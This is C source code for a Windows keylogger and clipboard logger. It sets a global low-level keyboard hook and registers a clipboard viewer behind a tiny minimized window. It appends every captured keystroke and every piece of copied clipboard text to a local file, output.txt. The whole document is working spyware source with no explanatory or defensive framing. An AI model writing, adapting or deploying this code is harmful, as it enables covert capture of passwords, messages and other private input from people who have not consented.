
#include <stdio.h>
#include <windows.h>
#include <stdbool.h>

long FAR PASCAL
WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

WCHAR getCharFromKey(KBDLLHOOKSTRUCT *pKeyInfo)
{
	BYTE keyboardState[256];
	GetKeyboardState(keyboardState);
	wprintf(L"%d %d ", pKeyInfo->vkCode, VK_SHIFT);

	if (pKeyInfo->vkCode == 160 || pKeyInfo->vkCode == 20 || pKeyInfo->vkCode == 162 || pKeyInfo->vkCode == 27 || pKeyInfo->vkCode == 91)
	{
		return L'$';
	}
	if(pKeyInfo->vkCode == 8){
		return L'|';
	}
	WCHAR buffer[5];
	int ret = ToUnicodeEx(pKeyInfo->vkCode, pKeyInfo->scanCode, keyboardState, buffer, 5, 0, GetKeyboardLayout(0));

	if (ret > 0)
	{
		return buffer[0];
	}
	else
	{
		return L'\0';
	}
}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT *pKeyInfo = (KBDLLHOOKSTRUCT *)lParam;
		FILE *file = _wfopen(L"output.txt", L"a, ccs=UTF-16LE");
		if (file != NULL)
		{
			fwprintf(file, L"%c", getCharFromKey(pKeyInfo));
			fclose(file);
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{

	HWND hwndConsole = FindWindowA(NULL, "");
	HINSTANCE hInstance = (HINSTANCE)GetWindowLong(hwndConsole, GWL_HINSTANCE);
	WNDCLASS wc = {0};
	wc.hInstance = hInstance;
	wc.lpfnWndProc = WndProc;
	wc.lpszClassName = TEXT("loh");
	;
	if (!RegisterClass(&wc))
	{
		return 1;
	}

	HWND hwndWindow = CreateWindow(TEXT("loh"),
								   TEXT("loh"),
								   WS_MINIMIZE,
								   100, 0,
								   1, 1,
								   NULL,
								   NULL,
								   hInstance,
								   NULL);

	ShowWindow(hwndWindow, SW_SHOWMINIMIZED);
	UpdateWindow(hwndWindow);
	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (hHook == NULL)
	{
		printf("Failed to set hook\n");
		return 1;
	}
	MSG msg;
	while (GetMessage(&msg, hwndWindow, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);
	return msg.wParam;
}

long FAR PASCAL
WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static HWND hwndNextViewer;
	HDC hdc;
	PAINTSTRUCT ps;
	FILE *file;

	switch (uMsg)
	{
	case WM_PAINT:
		if (hwndNextViewer != NULL)
		{
			SendMessage(hwndNextViewer, uMsg, wParam, lParam);
		}
		hdc = BeginPaint(hwnd, &ps);
		if (OpenClipboard(hwnd))
		{
			HANDLE hdata = GetClipboardData(CF_UNICODETEXT);
			if (hdata != NULL)
			{
				HANDLE hdata = GetClipboardData(CF_UNICODETEXT);

				wchar_t *lData = (wchar_t *)GlobalLock(hdata);

				file = _wfopen(L"output.txt", L"a, ccs=UTF-16LE");
				if (file != NULL)
				{

					const wchar_t *text = lData;

					fwprintf(file, L"%s\n", text);

					fclose(file);
				}

			}
			
				CloseClipboard();
				return 0;
		}
		EndPaint(hwnd, &ps);
		break;
	case WM_CREATE:
		hwndNextViewer = SetClipboardViewer(hwnd);
		break;
	case WM_DESTROY:

		ChangeClipboardChain(hwnd, hwndNextViewer);
		PostQuitMessage(0);
		break;
	case WM_CHANGECBCHAIN:
		if (wParam == (hwndNextViewer))
		{
			hwndNextViewer = (HWND)(lParam);
		}
		else
		{
			if (hwndNextViewer != NULL)
			{ 
				SendMessage(hwndNextViewer, uMsg, wParam, lParam);
			}
		}
		return 0;
	case WM_DRAWCLIPBOARD:
		InvalidateRect(hwnd, NULL, TRUE);
		UpdateWindow(hwnd);
		SendMessage(hwndNextViewer, uMsg, wParam, lParam);
		break;

	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}

	return (LRESULT)NULL;
}